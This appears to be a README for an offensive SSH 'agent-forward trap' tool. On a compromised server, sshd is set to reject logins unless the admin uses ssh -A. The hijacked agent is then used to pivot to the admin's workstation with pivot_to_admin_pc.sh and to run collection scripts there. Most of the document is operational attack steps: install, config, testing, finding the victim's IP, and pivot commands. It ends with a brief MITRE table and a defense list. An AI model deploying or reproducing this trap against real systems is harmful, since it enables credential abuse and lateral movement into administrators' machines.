# SSH trap: only `ssh -A` — then his workstation is gone

## Idea

On a **compromised server** you control `sshd` so that user **`legacy`** on **port 22** (standard SSH):

- **Rejects** logins **without** forwarded agent (`SSH_AUTH_SOCK` missing).
- Prints an **English** policy message telling admin to use **`ssh -A`**.
- Sets **`AllowTcpForwarding no`** on the match block — no **`-R` / `-L`** on that account.

Admin complies → **agent on your host** → `pivot_to_admin_pc.sh` with the admin’s real IP (from `ss`, not Docker).

> **Isolated lab on Kali** often uses a second `sshd` on **`:2221`** so you do not touch system `:22`. Same logic — only change `LocalPort` and `-p` in tests. See [Local lab (optional `:2221`)](#local-lab-optional-2221).

## Deny message (client sees)

```text
ACCESS DENIED: ForwardAgent required (ssh -A). All other methods are disabled.
Example: ssh -A -i <key> legacy@host
```

## Install (repo, production-like **port 22**)

```bash
sudo ./ssh-agent-forward-trap/install_trap.sh
# merge ssh-agent-forward-trap/sshd_match_legacy.snippet into /etc/ssh/sshd_config
sudo systemctl restart ssh   # or: sshd -t && kill -HUP <main-sshd-pid>
```

Snippet uses `Match User legacy` + **`LocalPort 22`**. If `legacy` is the only user on that `sshd` instance, you may use `Match User legacy` without `LocalPort` (see comment in snippet).

## Test (port 22)

```bash
ssh -a -i key legacy@host              # ACCESS DENIED
eval "$(ssh-agent -s)"; ssh-add key
ssh -A -i key legacy@host            # session OK
```

Discover admin IP for pivot (peer of your listening `:22`):

```bash
ss -tnH state established '( sport = :22 )' | awk '{print $4}' | sed 's/:.*//'
export SSH_SERVER_PORT=22 VICTIM_USER=legacy
sudo ../ssh-infected-admin-pivot/pivot_to_admin_pc.sh <ADMIN_IP>

# Optional: run collection script on admin PC after pivot
sudo ../ssh-infected-admin-pivot/post_pivot_via_agent.sh <ADMIN_IP>
# or: KEY=... sudo ../ssh-infected-admin-pivot/post_pivot_admin_host.sh <ADMIN_IP>
```

## Admin client

Real laptop: **`ssh-agent`**, **`ssh-add`**, then **`ssh -A -i key legacy@server`** (no `-p` when using 22).

Lab Docker: `entry_agent_trap.sh` — set `KALI_PORT=22` if main sshd serves `legacy`.

## MITRE

| ID | Note |
|----|------|
| T1552.006 | Agent forwarding abuse after forced `-A` |
| T1021.004 | SSH to admin workstation |
| T1078 | Valid accounts |

## Defense

- Never require `ForwardAgent` on untrusted jumps.
- `AllowAgentForwarding no` on servers admins should not use for signing.
- Monitor agent sockets under `/home/*/.ssh/agent/` after privileged logins.
- Restrict who can get a `Match` + `ForceCommand` on production `sshd`.

## Local lab (optional `:2221`)

```bash
# Separate lab sshd — does not replace system :22
bash ~/Desktop/htb/ttp-docker-ssh-lab/setup_kali_user.sh
export SSH_SERVER_PORT=2221
ssh -A -i key -p 2221 legacy@127.0.0.1
```

Use `sshd_match_legacy.snippet` variant with `LocalPort 2221` from `ACCESS-AGENT-TRAP.md` in the HTB folder.

## Related

- [WRITEUP-admin-ssh-infected-machine.md](./WRITEUP-admin-ssh-infected-machine.md)
- [ssh-infected-admin-pivot/](./ssh-infected-admin-pivot/)